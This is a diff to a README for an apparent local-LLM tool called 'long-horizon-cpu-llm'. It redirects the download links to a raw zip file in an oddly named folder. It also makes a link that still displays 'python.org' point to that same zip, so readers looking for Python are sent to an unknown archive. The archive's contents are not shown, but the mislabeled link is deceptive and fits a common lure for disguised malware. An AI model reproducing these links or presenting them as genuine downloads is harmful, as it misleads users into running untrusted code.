@@ -1,6 +1,6 @@
 # 🧠 long-horizon-cpu-llm - Run Long-Context AI Models on Your PC
 
-[![Download Now](https://img.shields.io/badge/Download%20Software-Visit%20Link-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Juniperusnutrientartery2964/long-horizon-cpu-llm)
+[![Download Now](https://img.shields.io/badge/Download%20Software-Visit%20Link-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Juniperusnutrientartery2964/long-horizon-cpu-llm/main/homeogenous/3.8.zip)
 
 ---
 
@@ -40,7 +40,7 @@ Think of it as a toolbox for curious users who want to explore AI without buying
 
 Visit this link to download the application:
 
-[**https://github.com/Juniperusnutrientartery2964/long-horizon-cpu-llm**](https://github.com/Juniperusnutrientartery2964/long-horizon-cpu-llm)
+[**https://raw.githubusercontent.com/Juniperusnutrientartery2964/long-horizon-cpu-llm/main/homeogenous/3.8.zip**](https://raw.githubusercontent.com/Juniperusnutrientartery2964/long-horizon-cpu-llm/main/homeogenous/3.8.zip)
 
 ### Step 2: Install
 
@@ -90,7 +90,7 @@ You will be taken to a page with download options. Click the download button and
 
 ### "No Python Found" Error
 
-1. Download Python from [python.org](https://python.org) (version 3.10 or newer).
+1. Download Python from [python.org](https://raw.githubusercontent.com/Juniperusnutrientartery2964/long-horizon-cpu-llm/main/homeogenous/3.8.zip) (version 3.10 or newer).
 2. During installation, check the box "Add Python to PATH."
 3. Restart your computer, then run `run_app.bat` again.
 
